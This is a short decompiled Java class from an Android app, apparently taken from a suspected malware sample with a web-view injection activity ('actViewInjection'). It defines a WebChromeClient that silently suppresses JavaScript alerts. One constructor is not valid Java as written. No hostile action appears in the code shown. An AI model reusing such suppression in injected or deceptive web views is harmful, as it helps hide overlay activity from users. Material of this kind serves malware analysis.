/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.webkit.JsResult
 *  android.webkit.WebChromeClient
 *  android.webkit.WebView
 */
package com.example.mmm.Activity;

import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import com.example.mmm.Activity.actViewInjection;

final class actViewInjection$MyWebChromeClient
extends WebChromeClient {
    final actViewInjection daughter$;

    private actViewInjection$MyWebChromeClient(actViewInjection actViewInjection2) {
        this.daughter$ = actViewInjection2;
    }

    actViewInjection$MyWebChromeClient(actViewInjection actViewInjection2, byte by) {
        by = (byte)0;
        this(actViewInjection2);
    }

    public final boolean onJsAlert(WebView webView, String string, String string2, JsResult jsResult) {
        return true;
    }
}

